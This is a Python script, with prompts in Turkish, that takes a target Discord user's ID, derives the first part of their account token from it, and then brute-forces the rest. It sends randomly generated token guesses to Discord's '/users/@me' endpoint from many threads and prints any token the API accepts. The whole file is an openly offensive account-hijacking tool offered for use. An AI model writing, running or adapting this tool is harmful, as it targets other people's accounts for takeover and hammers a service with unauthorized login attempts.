import base64
import string
import random
import threading
import requests
from rich.console import Console
console = Console()


def run():
    user_id = console.input("[bold white]  Hedef Discord User ID: [/]").strip()
    if not user_id or not user_id.isdigit():
        console.print("[red]  Gecerli bir ID girin.[/]")
        return

    part1 = base64.b64encode(user_id.encode()).decode().replace("=", "")
    console.print(f"[#818cf8]  Token Part 1: {part1}.[/]")

    brute = console.input("[bold white]  Brute force denemesi yapilsin mi? (e/h): [/]").strip().lower()
    if brute != "e":
        console.print(f"[dim]  Token baslangici: {part1}.<part2>.<part3>[/]")
        return

    thread_str = console.input("[bold white]  Thread sayisi (varsayilan 5): [/]").strip()
    threads_num = int(thread_str) if thread_str.isdigit() and 0 < int(thread_str) <= 50 else 5

    console.print(f"[#818cf8]  {threads_num} thread ile brute force baslatildi... Ctrl+C ile durdurun.[/]")

    found = {"count": 0, "valid": []}
    lock = threading.Lock()
    chars = string.ascii_letters + string.digits + "-_"

    def check():
        while True:
            p2 = "".join(random.choice(chars) for _ in range(6))
            p3 = "".join(random.choice(chars) for _ in range(38))
            token = f"{part1}.{p2}.{p3}"
            try:
                r = requests.get("https://discord.com/api/v10/users/@me",
                                 headers={"Authorization": token}, timeout=5)
                with lock:
                    found["count"] += 1
                    if found["count"] % 100 == 0:
                        console.print(f"[dim]  Denenen: {found['count']}[/]")
                    if r.status_code == 200:
                        found["valid"].append(token)
                        console.print(f"[bold green]  GECERLI TOKEN BULUNDU: {token}[/]")
            except Exception:
                pass

    threads = []
    try:
        for _ in range(threads_num):
            t = threading.Thread(target=check, daemon=True)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        console.print(f"\n[dim]  Durduruldu. Toplam deneme: {found['count']}[/]")
        if found["valid"]:
            for v in found["valid"]:
                console.print(f"  [green]{v}[/]")
        else:
            console.print("[yellow]  Gecerli token bulunamadi.[/]")
